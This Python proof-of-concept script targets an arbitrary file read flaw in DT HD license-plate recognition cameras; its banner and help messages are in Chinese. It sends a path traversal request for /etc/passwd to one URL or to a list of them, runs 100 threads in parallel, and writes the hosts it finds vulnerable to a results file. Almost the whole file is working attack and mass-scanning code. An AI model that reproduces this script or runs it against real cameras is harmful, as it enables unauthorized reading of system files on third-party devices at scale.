import argparse
import requests
import os
import sys
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def banner():
    test = '''

    DT高清车牌识别摄像机存在任意文件读取漏洞

                                               author:sanhua
                                               date:2024-09-13
                                               version:1.0
    '''
    print(test)


def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target
    payload = "/../../../../etc/passwd"
    url = target + payload

    try:
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            print(f"[+] {target} 存在任意文件读取漏洞")
            with open("result.txt", "a", encoding='utf-8') as f:
                f.write(f"{target} 存在任意文件读取漏洞\n")
        else:
            print(f"[-] {target} 不存在任意文件读取漏洞")
    except requests.exceptions.RequestException as e:
        print(f"[!] {target} 连接超时或其他错误: {e}")


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="DT高清车牌识别摄像机存在任意文件读取漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t DT高清车牌识别摄像机存在任意文件读取漏洞.py -h")


if __name__ == '__main__':
    main()
